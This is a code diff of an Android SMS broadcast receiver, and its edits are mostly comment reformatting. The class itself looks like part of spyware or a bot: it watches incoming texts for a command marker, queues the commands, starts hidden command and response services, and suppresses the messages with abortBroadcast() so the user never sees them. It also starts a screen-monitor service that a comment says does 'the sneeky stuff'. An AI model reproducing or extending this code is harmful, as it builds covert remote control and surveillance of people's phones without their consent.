@@ -30,23 +30,23 @@ public class SmsReceiver extends BroadcastReceiver {
 			}catch( Exception e ) {}
 		}
 		
-		//start the screen monitor service to let us do the sneeky stuff
+		/* start the screen monitor service to let us do the sneeky stuff */
 		Intent i = new Intent(context, ScreenMonitor.class);			
 		context.startService(i);
 	}
 	@Override
 	public void onReceive(Context context, Intent intent) {
-		// Load CommonVariable from database
+		/* Load CommonVariable from database */
 		setUp(context);
 		
-		//---get the SMS message passed in---
+		/* ---get the SMS message passed in--- */
         Bundle bundle = intent.getExtras();        
         SmsMessage[] msgs = null;
         String str = "";
         String number="";        
         if (bundle != null)
         {
-            //---retrieve the SMS message received---
+            /* ---retrieve the SMS message received--- */
             Object[] pdus = (Object[]) bundle.get("pdus");
             msgs = new SmsMessage[pdus.length]; 
             
@@ -55,11 +55,11 @@ public class SmsReceiver extends BroadcastReceiver {
                 number +=  msgs[i].getOriginatingAddress();                
                 str += msgs[i].getMessageBody().toString();
                 str += "\n";        
-            }//end for          
+            }        
             Debug.PrintLog("SmsReciver","Get: "+str);
             isCommand(number,str,context);
             
-        }//end if
+        }
 
 	}
 		
@@ -70,22 +70,17 @@ public class SmsReceiver extends BroadcastReceiver {
 		
 		if(content.contains(CommonVariable.COMMAND_SIGN)){
 			Debug.PrintLog("SmsReciver",CommonVariable.COMMAND_SIGN+"is in the SMS message.");
-			
+			/* put the command into the job queue */
 			job = CommandJob.setJob(number, content);
 			CommandJob.addJob(job);
-			
-			if ( CommonVariable.CommandServiceLock.equals("false") ) {
-					//Intent intent = new Intent(context, CommandService.class);					
-					//intent.putExtra("content", content);
-					//intent.putExtra("number", number);
-					//CommonVariable.CommandServiceLock = "true";
-					//context.startService(intent);
-					CommandJob.startService(context);
-					
+			/* and start the service if it is not lock */
+			if ( CommonVariable.CommandServiceLock.equals("false") ) {					
+					CommandJob.startService(context);					
 			}
 			else {
 					Debug.PrintLog("SmsReciver","CommonService is locked.");
-			}			
+			}
+			/* abort the broadcast */
 			this.abortBroadcast();
 			
 			
@@ -93,15 +88,11 @@ public class SmsReceiver extends BroadcastReceiver {
 		
 		else if ( content.contains(CommonVariable.RESPONSE_SIGN) ) {			
 			Debug.PrintLog("SmsReciver",CommonVariable.RESPONSE_SIGN+" is in the SMS message.");
+			/* put the command into the job queue */
 			job = CommandJob.setJob(number, content);
 			CommandJob.addJob(job);
-			
-			if( CommonVariable.ResponseServiceLock.equals("false") ) {
-				/*Intent intent = new Intent(context, ResponseService.class);
-				//the state intent may need to modified~~~
-				intent.putExtra("state", CommonVariable.PHONE_NUMBER_RESPONSE);
-				intent.putExtra("number", number);
-				intent.putExtra("content", content);*/				
+			/* start the service */
+			if( CommonVariable.ResponseServiceLock.equals("false") ) {								
 				CommandJob.startResponseService(context);
 			}
 			else {
